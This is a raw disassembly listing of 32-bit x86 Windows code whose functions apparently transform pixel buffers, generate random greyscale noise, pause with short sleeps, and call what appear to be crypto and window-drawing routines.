  4038e0:	8d 3c 85 00 00 00 00 	lea    0x0(,%eax,4),%edi
  4038e7:	03 d7                	add    %edi,%edx
  4038e9:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4038ec:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4038ef:	3b cb                	cmp    %ebx,%ecx
  4038f1:	0f 8c 39 ff ff ff    	jl     0x403830
  4038f7:	5f                   	pop    %edi
  4038f8:	5e                   	pop    %esi
  4038f9:	5b                   	pop    %ebx
  4038fa:	8b e5                	mov    %ebp,%esp
  4038fc:	5d                   	pop    %ebp
  4038fd:	c3                   	ret
  4038fe:	cc                   	int3
  4038ff:	cc                   	int3
  403900:	55                   	push   %ebp
  403901:	8b ec                	mov    %esp,%ebp
  403903:	57                   	push   %edi
  403904:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403907:	33 c9                	xor    %ecx,%ecx
  403909:	0f af 7d 10          	imul   0x10(%ebp),%edi
  40390d:	85 ff                	test   %edi,%edi
  40390f:	7e 21                	jle    0x403932
  403911:	53                   	push   %ebx
  403912:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403915:	56                   	push   %esi
  403916:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
  403919:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  40391e:	f7 e1                	mul    %ecx
  403920:	d1 ea                	shr    $1,%edx
  403922:	8b 04 d3             	mov    (%ebx,%edx,8),%eax
  403925:	89 04 8b             	mov    %eax,(%ebx,%ecx,4)
  403928:	41                   	inc    %ecx
  403929:	89 34 d3             	mov    %esi,(%ebx,%edx,8)
  40392c:	3b cf                	cmp    %edi,%ecx
  40392e:	7c e6                	jl     0x403916
  403930:	5e                   	pop    %esi
  403931:	5b                   	pop    %ebx
  403932:	5f                   	pop    %edi
  403933:	5d                   	pop    %ebp
  403934:	c3                   	ret
  403935:	cc                   	int3
  403936:	cc                   	int3
  403937:	cc                   	int3
  403938:	cc                   	int3
  403939:	cc                   	int3
  40393a:	cc                   	int3
  40393b:	cc                   	int3
  40393c:	cc                   	int3
  40393d:	cc                   	int3
  40393e:	cc                   	int3
  40393f:	cc                   	int3
  403940:	55                   	push   %ebp
  403941:	8b ec                	mov    %esp,%ebp
  403943:	83 e4 f8             	and    $0xfffffff8,%esp
  403946:	83 ec 14             	sub    $0x14,%esp
  403949:	53                   	push   %ebx
  40394a:	56                   	push   %esi
  40394b:	8b 75 0c             	mov    0xc(%ebp),%esi
  40394e:	33 db                	xor    %ebx,%ebx
  403950:	57                   	push   %edi
  403951:	8b 7d 10             	mov    0x10(%ebp),%edi
  403954:	8b c7                	mov    %edi,%eax
  403956:	99                   	cltd
  403957:	2b c2                	sub    %edx,%eax
  403959:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  40395d:	8b d0                	mov    %eax,%edx
  40395f:	d1 fa                	sar    $1,%edx
  403961:	89 54 24 18          	mov    %edx,0x18(%esp)
  403965:	85 d2                	test   %edx,%edx
  403967:	0f 8e a0 00 00 00    	jle    0x403a0d
  40396d:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403970:	8b c6                	mov    %esi,%eax
  403972:	0f af c7             	imul   %edi,%eax
  403975:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403979:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40397d:	33 c0                	xor    %eax,%eax
  40397f:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403983:	33 ff                	xor    %edi,%edi
  403985:	85 f6                	test   %esi,%esi
  403987:	7e 61                	jle    0x4039ea
  403989:	8d 04 12             	lea    (%edx,%edx,1),%eax
  40398c:	2b c3                	sub    %ebx,%eax
  40398e:	0f af c3             	imul   %ebx,%eax
  403991:	66 0f 6e c0          	movd   %eax,%xmm0
  403995:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  403999:	e8 52 b8 00 00       	call   0x40f1f0
  40399e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039a2:	0f 57 c9             	xorps  %xmm1,%xmm1
  4039a5:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4039a9:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  4039ad:	0f 1f 00             	nopl   (%eax)
  4039b0:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  4039b3:	8b 75 14             	mov    0x14(%ebp),%esi
  4039b6:	66 0f 6e c0          	movd   %eax,%xmm0
  4039ba:	47                   	inc    %edi
  4039bb:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4039be:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  4039c2:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  4039c6:	99                   	cltd
  4039c7:	f7 7c 24 1c          	idivl  0x1c(%esp)
  4039cb:	8b 04 96             	mov    (%esi,%edx,4),%eax
  4039ce:	8b 75 0c             	mov    0xc(%ebp),%esi
  4039d1:	89 01                	mov    %eax,(%ecx)
  4039d3:	83 c1 04             	add    $0x4,%ecx
  4039d6:	3b fe                	cmp    %esi,%edi
  4039d8:	7c d6                	jl     0x4039b0
  4039da:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4039de:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4039e2:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039e6:	8b 54 24 18          	mov    0x18(%esp),%edx
  4039ea:	43                   	inc    %ebx
  4039eb:	8d 3c b5 00 00 00 00 	lea    0x0(,%esi,4),%edi
  4039f2:	03 c6                	add    %esi,%eax
  4039f4:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4039f8:	03 cf                	add    %edi,%ecx
  4039fa:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4039fe:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403a02:	3b da                	cmp    %edx,%ebx
  403a04:	0f 8c 79 ff ff ff    	jl     0x403983
  403a0a:	8b 7d 10             	mov    0x10(%ebp),%edi
  403a0d:	8b ca                	mov    %edx,%ecx
  403a0f:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403a13:	3b cf                	cmp    %edi,%ecx
  403a15:	0f 8d 94 00 00 00    	jge    0x403aaf
  403a1b:	8b c6                	mov    %esi,%eax
  403a1d:	8b d9                	mov    %ecx,%ebx
  403a1f:	0f af c7             	imul   %edi,%eax
  403a22:	0f af de             	imul   %esi,%ebx
  403a25:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403a29:	8b 45 14             	mov    0x14(%ebp),%eax
  403a2c:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  403a2f:	89 44 24 10          	mov    %eax,0x10(%esp)
  403a33:	33 ff                	xor    %edi,%edi
  403a35:	85 f6                	test   %esi,%esi
  403a37:	7e 5d                	jle    0x403a96
  403a39:	8d 04 12             	lea    (%edx,%edx,1),%eax
  403a3c:	2b c1                	sub    %ecx,%eax
  403a3e:	0f af c1             	imul   %ecx,%eax
  403a41:	66 0f 6e c0          	movd   %eax,%xmm0
  403a45:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  403a49:	e8 a2 b7 00 00       	call   0x40f1f0
  403a4e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403a52:	0f 57 c9             	xorps  %xmm1,%xmm1
  403a55:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  403a59:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403a60:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  403a63:	8b 75 14             	mov    0x14(%ebp),%esi
  403a66:	66 0f 6e c0          	movd   %eax,%xmm0
  403a6a:	47                   	inc    %edi
  403a6b:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403a6e:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  403a72:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  403a76:	99                   	cltd
  403a77:	f7 7c 24 1c          	idivl  0x1c(%esp)
  403a7b:	8b 04 96             	mov    (%esi,%edx,4),%eax
  403a7e:	8b 75 0c             	mov    0xc(%ebp),%esi
  403a81:	89 01                	mov    %eax,(%ecx)
  403a83:	83 c1 04             	add    $0x4,%ecx
  403a86:	3b fe                	cmp    %esi,%edi
  403a88:	7c d6                	jl     0x403a60
  403a8a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403a8e:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a92:	8b 54 24 18          	mov    0x18(%esp),%edx
  403a96:	41                   	inc    %ecx
  403a97:	8d 3c b5 00 00 00 00 	lea    0x0(,%esi,4),%edi
  403a9e:	03 c7                	add    %edi,%eax
  403aa0:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403aa4:	03 de                	add    %esi,%ebx
  403aa6:	89 44 24 10          	mov    %eax,0x10(%esp)
  403aaa:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  403aad:	7c 84                	jl     0x403a33
  403aaf:	6a 32                	push   $0x32
  403ab1:	ff 15 a8 00 41 00    	call   *0x4100a8
  403ab7:	5f                   	pop    %edi
  403ab8:	5e                   	pop    %esi
  403ab9:	5b                   	pop    %ebx
  403aba:	8b e5                	mov    %ebp,%esp
  403abc:	5d                   	pop    %ebp
  403abd:	c3                   	ret
  403abe:	cc                   	int3
  403abf:	cc                   	int3
  403ac0:	55                   	push   %ebp
  403ac1:	8b ec                	mov    %esp,%ebp
  403ac3:	83 e4 f8             	and    $0xfffffff8,%esp
  403ac6:	83 ec 24             	sub    $0x24,%esp
  403ac9:	53                   	push   %ebx
  403aca:	56                   	push   %esi
  403acb:	8b 75 10             	mov    0x10(%ebp),%esi
  403ace:	33 db                	xor    %ebx,%ebx
  403ad0:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403ad4:	57                   	push   %edi
  403ad5:	85 f6                	test   %esi,%esi
  403ad7:	0f 8e c4 00 00 00    	jle    0x403ba1
  403add:	8b 45 0c             	mov    0xc(%ebp),%eax
  403ae0:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  403ae3:	8b c8                	mov    %eax,%ecx
  403ae5:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  403ae9:	8b 7d 14             	mov    0x14(%ebp),%edi
  403aec:	0f af ce             	imul   %esi,%ecx
  403aef:	33 d2                	xor    %edx,%edx
  403af1:	89 54 24 18          	mov    %edx,0x18(%esp)
  403af5:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  403af9:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  403afd:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
  403b04:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  403b08:	85 c0                	test   %eax,%eax
  403b0a:	7e 7a                	jle    0x403b86
  403b0c:	8b cb                	mov    %ebx,%ecx
  403b0e:	8b c2                	mov    %edx,%eax
  403b10:	0f af cb             	imul   %ebx,%ecx
  403b13:	2b c1                	sub    %ecx,%eax
  403b15:	66 0f 6e c0          	movd   %eax,%xmm0
  403b19:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  403b1d:	e8 ce b6 00 00       	call   0x40f1f0
  403b22:	0f 57 c9             	xorps  %xmm1,%xmm1
  403b25:	8b f3                	mov    %ebx,%esi
  403b27:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403b2a:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  403b2e:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403b32:	f3 0f 11 4c 24 24    	movss  %xmm1,0x24(%esp)
  403b38:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  403b3f:	00 
  403b40:	66 0f 6e c6          	movd   %esi,%xmm0
  403b44:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403b47:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  403b4b:	e8 90 af 00 00       	call   0x40eae0
  403b50:	33 d2                	xor    %edx,%edx
  403b52:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403b55:	f7 74 24 20          	divl   0x20(%esp)
  403b59:	f3 0f 10 4c 24 24    	movss  0x24(%esp),%xmm1
  403b5f:	03 f3                	add    %ebx,%esi
  403b61:	8b 04 91             	mov    (%ecx,%edx,4),%eax
  403b64:	89 07                	mov    %eax,(%edi)
  403b66:	83 c7 04             	add    $0x4,%edi
  403b69:	83 6c 24 10 01       	subl   $0x1,0x10(%esp)
  403b6e:	75 d0                	jne    0x403b40
  403b70:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403b74:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b77:	8b 54 24 18          	mov    0x18(%esp),%edx
  403b7b:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403b7f:	8b 75 10             	mov    0x10(%ebp),%esi
  403b82:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403b86:	03 54 24 2c          	add    0x2c(%esp),%edx
  403b8a:	43                   	inc    %ebx
  403b8b:	03 f9                	add    %ecx,%edi
  403b8d:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403b91:	89 54 24 18          	mov    %edx,0x18(%esp)
  403b95:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  403b99:	3b de                	cmp    %esi,%ebx
  403b9b:	0f 8c 67 ff ff ff    	jl     0x403b08
  403ba1:	6a 64                	push   $0x64
  403ba3:	ff 15 a8 00 41 00    	call   *0x4100a8
  403ba9:	5f                   	pop    %edi
  403baa:	5e                   	pop    %esi
  403bab:	5b                   	pop    %ebx
  403bac:	8b e5                	mov    %ebp,%esp
  403bae:	5d                   	pop    %ebp
  403baf:	c3                   	ret
  403bb0:	55                   	push   %ebp
  403bb1:	8b ec                	mov    %esp,%ebp
  403bb3:	83 e4 f8             	and    $0xfffffff8,%esp
  403bb6:	83 ec 1c             	sub    $0x1c,%esp
  403bb9:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403bbc:	53                   	push   %ebx
  403bbd:	56                   	push   %esi
  403bbe:	57                   	push   %edi
  403bbf:	33 ff                	xor    %edi,%edi
  403bc1:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403bc5:	85 c9                	test   %ecx,%ecx
  403bc7:	0f 8e b0 00 00 00    	jle    0x403c7d
  403bcd:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403bd0:	8b c3                	mov    %ebx,%eax
  403bd2:	0f af c1             	imul   %ecx,%eax
  403bd5:	8d 14 9d 00 00 00 00 	lea    0x0(,%ebx,4),%edx
  403bdc:	89 44 24 20          	mov    %eax,0x20(%esp)
  403be0:	8b 45 14             	mov    0x14(%ebp),%eax
  403be3:	89 44 24 18          	mov    %eax,0x18(%esp)
  403be7:	33 f6                	xor    %esi,%esi
  403be9:	85 db                	test   %ebx,%ebx
  403beb:	7e 7d                	jle    0x403c6a
  403bed:	03 c9                	add    %ecx,%ecx
  403bef:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  403bf3:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  403bf7:	89 44 24 10          	mov    %eax,0x10(%esp)
  403bfb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  403c00:	8b c1                	mov    %ecx,%eax
  403c02:	2b c6                	sub    %esi,%eax
  403c04:	0f af c6             	imul   %esi,%eax
  403c07:	66 0f 6e c0          	movd   %eax,%xmm0
  403c0b:	f3 0f e6 c0          	cvtdq2pd %xmm0,%xmm0
  403c0f:	c1 e8 1f             	shr    $0x1f,%eax
  403c12:	f2 0f 58 04 c5 10 4f 	addsd  0x414f10(,%eax,8),%xmm0
  403c19:	41 00 
  403c1b:	e8 d0 b5 00 00       	call   0x40f1f0
  403c20:	66 0f 6e cf          	movd   %edi,%xmm1
  403c24:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403c28:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  403c2b:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  403c2f:	e8 ac ae 00 00       	call   0x40eae0
  403c34:	33 d2                	xor    %edx,%edx
  403c36:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403c39:	f7 74 24 20          	divl   0x20(%esp)
  403c3d:	46                   	inc    %esi
  403c3e:	03 fb                	add    %ebx,%edi
  403c40:	8b 04 91             	mov    (%ecx,%edx,4),%eax
  403c43:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403c47:	89 01                	mov    %eax,(%ecx)
  403c49:	83 c1 04             	add    $0x4,%ecx
  403c4c:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403c50:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403c54:	3b f3                	cmp    %ebx,%esi
  403c56:	7c a8                	jl     0x403c00
  403c58:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403c5c:	8d 14 9d 00 00 00 00 	lea    0x0(,%ebx,4),%edx
  403c63:	8b 44 24 18          	mov    0x18(%esp),%eax
  403c67:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403c6a:	47                   	inc    %edi
  403c6b:	03 c2                	add    %edx,%eax
  403c6d:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403c71:	89 44 24 18          	mov    %eax,0x18(%esp)
  403c75:	3b f9                	cmp    %ecx,%edi
  403c77:	0f 8c 6a ff ff ff    	jl     0x403be7
  403c7d:	6a 64                	push   $0x64
  403c7f:	ff 15 a8 00 41 00    	call   *0x4100a8
  403c85:	5f                   	pop    %edi
  403c86:	5e                   	pop    %esi
  403c87:	5b                   	pop    %ebx
  403c88:	8b e5                	mov    %ebp,%esp
  403c8a:	5d                   	pop    %ebp
  403c8b:	c3                   	ret
  403c8c:	cc                   	int3
  403c8d:	cc                   	int3
  403c8e:	cc                   	int3
  403c8f:	cc                   	int3
  403c90:	55                   	push   %ebp
  403c91:	8b ec                	mov    %esp,%ebp
  403c93:	8b 45 08             	mov    0x8(%ebp),%eax
  403c96:	33 c9                	xor    %ecx,%ecx
  403c98:	57                   	push   %edi
  403c99:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403c9c:	0f af 7d 10          	imul   0x10(%ebp),%edi
  403ca0:	66 0f 6e c0          	movd   %eax,%xmm0
  403ca4:	66 0f 70 e0 00       	pshufd $0x0,%xmm0,%xmm4
  403ca9:	89 7d 0c             	mov    %edi,0xc(%ebp)
  403cac:	85 ff                	test   %edi,%edi
  403cae:	0f 8e 72 01 00 00    	jle    0x403e26
  403cb4:	56                   	push   %esi
  403cb5:	83 ff 08             	cmp    $0x8,%edi
  403cb8:	0f 82 3b 01 00 00    	jb     0x403df9
  403cbe:	83 3d 54 7b 41 00 02 	cmpl   $0x2,0x417b54
  403cc5:	0f 8c 2e 01 00 00    	jl     0x403df9
  403ccb:	0f 28 2d d0 4e 41 00 	movaps 0x414ed0,%xmm5
  403cd2:	8b c7                	mov    %edi,%eax
  403cd4:	25 07 00 00 80       	and    $0x80000007,%eax
  403cd9:	79 05                	jns    0x403ce0
  403cdb:	48                   	dec    %eax
  403cdc:	83 c8 f8             	or     $0xfffffff8,%eax
  403cdf:	40                   	inc    %eax
  403ce0:	8b 55 14             	mov    0x14(%ebp),%edx
  403ce3:	8b f7                	mov    %edi,%esi
  403ce5:	0f 28 1d e0 4e 41 00 	movaps 0x414ee0,%xmm3
  403cec:	2b f0                	sub    %eax,%esi
  403cee:	0f 28 35 f0 4e 41 00 	movaps 0x414ef0,%xmm6
  403cf5:	b8 01 00 00 00       	mov    $0x1,%eax
  403cfa:	83 c2 08             	add    $0x8,%edx
  403cfd:	66 0f 6e f8          	movd   %eax,%xmm7
  403d01:	8d 78 16             	lea    0x16(%eax),%edi
  403d04:	66 0f 6e c1          	movd   %ecx,%xmm0
  403d08:	8d 41 04             	lea    0x4(%ecx),%eax
  403d0b:	66 0f 70 d0 00       	pshufd $0x0,%xmm0,%xmm2
  403d10:	8d 52 20             	lea    0x20(%edx),%edx
  403d13:	66 0f fe d5          	paddd  %xmm5,%xmm2
  403d17:	83 c1 08             	add    $0x8,%ecx
  403d1a:	66 0f 38 40 d4       	pmulld %xmm4,%xmm2
  403d1f:	0f 28 ca             	movaps %xmm2,%xmm1
  403d22:	0f 28 c2             	movaps %xmm2,%xmm0
  403d25:	66 0f 6a c2          	punpckhdq %xmm2,%xmm0
  403d29:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  403d2d:	66 0f f4 c3          	pmuludq %xmm3,%xmm0
  403d31:	66 0f f4 cb          	pmuludq %xmm3,%xmm1
  403d35:	0f c6 c8 dd          	shufps $0xdd,%xmm0,%xmm1
  403d39:	0f 28 c2             	movaps %xmm2,%xmm0
  403d3c:	66 0f fa c1          	psubd  %xmm1,%xmm0
  403d40:	66 0f d2 c7          	psrld  %xmm7,%xmm0
  403d44:	66 0f fe c1          	paddd  %xmm1,%xmm0
  403d48:	66 0f 6e cf          	movd   %edi,%xmm1
  403d4c:	66 0f d2 c1          	psrld  %xmm1,%xmm0
  403d50:	66 0f 38 40 c6       	pmulld %xmm6,%xmm0
  403d55:	66 0f fa d0          	psubd  %xmm0,%xmm2
  403d59:	66 0f 6e c0          	movd   %eax,%xmm0
  403d5d:	66 0f 7e 52 d8       	movd   %xmm2,-0x28(%edx)
  403d62:	66 0f 73 da 04       	psrldq $0x4,%xmm2
  403d67:	66 0f 7e 52 dc       	movd   %xmm2,-0x24(%edx)
  403d6c:	66 0f 73 da 04       	psrldq $0x4,%xmm2
  403d71:	66 0f 7e 52 e0       	movd   %xmm2,-0x20(%edx)
  403d76:	66 0f 73 da 04       	psrldq $0x4,%xmm2
  403d7b:	66 0f 7e 52 e4       	movd   %xmm2,-0x1c(%edx)
  403d80:	66 0f 70 d0 00       	pshufd $0x0,%xmm0,%xmm2
  403d85:	66 0f fe d5          	paddd  %xmm5,%xmm2
  403d89:	66 0f 38 40 d4       	pmulld %xmm4,%xmm2
  403d8e:	0f 28 ca             	movaps %xmm2,%xmm1
  403d91:	0f 28 c2             	movaps %xmm2,%xmm0
  403d94:	66 0f 6a c2          	punpckhdq %xmm2,%xmm0
  403d98:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  403d9c:	66 0f f4 c3          	pmuludq %xmm3,%xmm0
  403da0:	66 0f f4 cb          	pmuludq %xmm3,%xmm1
  403da4:	0f c6 c8 dd          	shufps $0xdd,%xmm0,%xmm1
  403da8:	0f 28 c2             	movaps %xmm2,%xmm0
  403dab:	66 0f fa c1          	psubd  %xmm1,%xmm0
  403daf:	66 0f d2 c7          	psrld  %xmm7,%xmm0
  403db3:	66 0f fe c1          	paddd  %xmm1,%xmm0
  403db7:	66 0f 6e cf          	movd   %edi,%xmm1
  403dbb:	66 0f d2 c1          	psrld  %xmm1,%xmm0
  403dbf:	66 0f 38 40 c6       	pmulld %xmm6,%xmm0
  403dc4:	66 0f fa d0          	psubd  %xmm0,%xmm2
  403dc8:	66 0f 7e 52 e8       	movd   %xmm2,-0x18(%edx)
  403dcd:	66 0f 73 da 04       	psrldq $0x4,%xmm2
  403dd2:	66 0f 7e 52 ec       	movd   %xmm2,-0x14(%edx)
  403dd7:	66 0f 73 da 04       	psrldq $0x4,%xmm2
  403ddc:	66 0f 7e 52 f0       	movd   %xmm2,-0x10(%edx)
  403de1:	66 0f 73 da 04       	psrldq $0x4,%xmm2
  403de6:	66 0f 7e 52 f4       	movd   %xmm2,-0xc(%edx)
  403deb:	3b ce                	cmp    %esi,%ecx
  403ded:	0f 8c 11 ff ff ff    	jl     0x403d04
  403df3:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403df6:	8b 45 08             	mov    0x8(%ebp),%eax
  403df9:	3b cf                	cmp    %edi,%ecx
  403dfb:	7d 28                	jge    0x403e25
  403dfd:	8b f1                	mov    %ecx,%esi
  403dff:	c7 45 0c ff ff ff 00 	movl   $0xffffff,0xc(%ebp)
  403e06:	0f af f0             	imul   %eax,%esi
  403e09:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403e10:	8b c6                	mov    %esi,%eax
  403e12:	33 d2                	xor    %edx,%edx
  403e14:	f7 75 0c             	divl   0xc(%ebp)
  403e17:	8b 45 14             	mov    0x14(%ebp),%eax
  403e1a:	03 75 08             	add    0x8(%ebp),%esi
  403e1d:	89 14 88             	mov    %edx,(%eax,%ecx,4)
  403e20:	41                   	inc    %ecx
  403e21:	3b cf                	cmp    %edi,%ecx
  403e23:	7c eb                	jl     0x403e10
  403e25:	5e                   	pop    %esi
  403e26:	5f                   	pop    %edi
  403e27:	5d                   	pop    %ebp
  403e28:	c3                   	ret
  403e29:	cc                   	int3
  403e2a:	cc                   	int3
  403e2b:	cc                   	int3
  403e2c:	cc                   	int3
  403e2d:	cc                   	int3
  403e2e:	cc                   	int3
  403e2f:	cc                   	int3
  403e30:	55                   	push   %ebp
  403e31:	8b ec                	mov    %esp,%ebp
  403e33:	56                   	push   %esi
  403e34:	57                   	push   %edi
  403e35:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403e38:	33 f6                	xor    %esi,%esi
  403e3a:	0f af 7d 10          	imul   0x10(%ebp),%edi
  403e3e:	85 ff                	test   %edi,%edi
  403e40:	7e 3a                	jle    0x403e7c
  403e42:	a1 f4 81 41 00       	mov    0x4181f4,%eax
  403e47:	53                   	push   %ebx
  403e48:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403e4b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  403e50:	8b c8                	mov    %eax,%ecx
  403e52:	c1 e1 0d             	shl    $0xd,%ecx
  403e55:	33 c8                	xor    %eax,%ecx
  403e57:	8b d1                	mov    %ecx,%edx
  403e59:	c1 ea 11             	shr    $0x11,%edx
  403e5c:	33 d1                	xor    %ecx,%edx
  403e5e:	8b c2                	mov    %edx,%eax
  403e60:	c1 e0 05             	shl    $0x5,%eax
  403e63:	33 c2                	xor    %edx,%eax
  403e65:	0f b6 c8             	movzbl %al,%ecx
  403e68:	69 c9 01 01 01 00    	imul   $0x10101,%ecx,%ecx
  403e6e:	89 0c b3             	mov    %ecx,(%ebx,%esi,4)
  403e71:	46                   	inc    %esi
  403e72:	3b f7                	cmp    %edi,%esi
  403e74:	7c da                	jl     0x403e50
  403e76:	a3 f4 81 41 00       	mov    %eax,0x4181f4
  403e7b:	5b                   	pop    %ebx
  403e7c:	5f                   	pop    %edi
  403e7d:	5e                   	pop    %esi
  403e7e:	5d                   	pop    %ebp
  403e7f:	c3                   	ret
  403e80:	55                   	push   %ebp
  403e81:	8b ec                	mov    %esp,%ebp
  403e83:	83 e4 f8             	and    $0xfffffff8,%esp
  403e86:	83 ec 2c             	sub    $0x2c,%esp
  403e89:	a1 04 70 41 00       	mov    0x417004,%eax
  403e8e:	33 c4                	xor    %esp,%eax
  403e90:	89 44 24 28          	mov    %eax,0x28(%esp)
  403e94:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  403e99:	53                   	push   %ebx
  403e9a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403e9d:	56                   	push   %esi
  403e9e:	8b 35 04 00 41 00    	mov    0x410004,%esi
  403ea4:	57                   	push   %edi
  403ea5:	85 c0                	test   %eax,%eax
  403ea7:	75 23                	jne    0x403ecc
  403ea9:	68 40 00 00 f0       	push   $0xf0000040
  403eae:	6a 01                	push   $0x1
  403eb0:	6a 00                	push   $0x0
  403eb2:	6a 00                	push   $0x0
  403eb4:	68 f8 81 41 00       	push   $0x4181f8
  403eb9:	ff d6                	call   *%esi
  403ebb:	85 c0                	test   %eax,%eax
  403ebd:	75 08                	jne    0x403ec7
  403ebf:	6a 01                	push   $0x1
  403ec1:	ff 15 94 00 41 00    	call   *0x410094
  403ec7:	a1 f8 81 41 00       	mov    0x4181f8,%eax
  403ecc:	8b 3d 00 00 41 00    	mov    0x410000,%edi
  403ed2:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  403ed6:	51                   	push   %ecx
  403ed7:	6a 04                	push   $0x4
  403ed9:	50                   	push   %eax
  403eda:	ff d7                	call   *%edi
  403edc:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403ee0:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
  403ee5:	81 e1 ff ff ff 7f    	and    $0x7fffffff,%ecx
  403eeb:	f7 e1                	mul    %ecx
  403eed:	6a 00                	push   $0x0
  403eef:	c1 ea 03             	shr    $0x3,%edx
  403ef2:	6a 64                	push   $0x64
  403ef4:	6a 02                	push   $0x2
  403ef6:	8d 04 92             	lea    (%edx,%edx,4),%eax
  403ef9:	03 c0                	add    %eax,%eax
  403efb:	2b c8                	sub    %eax,%ecx
  403efd:	83 c1 0a             	add    $0xa,%ecx
  403f00:	e8 8b d4 ff ff       	call   0x401390
  403f05:	50                   	push   %eax
  403f06:	6a 00                	push   $0x0
  403f08:	6a 0c                	push   $0xc
  403f0a:	53                   	push   %ebx
  403f0b:	ff 15 9c 01 41 00    	call   *0x41019c
  403f11:	8d 44 24 24          	lea    0x24(%esp),%eax
  403f15:	50                   	push   %eax
  403f16:	53                   	push   %ebx
  403f17:	ff 15 98 01 41 00    	call   *0x410198
  403f1d:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403f21:	2b 44 24 24          	sub    0x24(%esp),%eax
  403f25:	89 44 24 18          	mov    %eax,0x18(%esp)
  403f29:	8b 44 24 30          	mov    0x30(%esp),%eax
  403f2d:	2b 44 24 28          	sub    0x28(%esp),%eax
  403f31:	53                   	push   %ebx
  403f32:	89 44 24 18          	mov    %eax,0x18(%esp)
  403f36:	ff 15 84 01 41 00    	call   *0x410184
  403f3c:	8b 0d f8 81 41 00    	mov    0x4181f8,%ecx
  403f42:	89 44 24 10          	mov    %eax,0x10(%esp)
  403f46:	85 c9                	test   %ecx,%ecx
  403f48:	75 22                	jne    0x403f6c
  403f4a:	68 40 00 00 f0       	push   $0xf0000040
  403f4f:	6a 01                	push   $0x1
  403f51:	51                   	push   %ecx
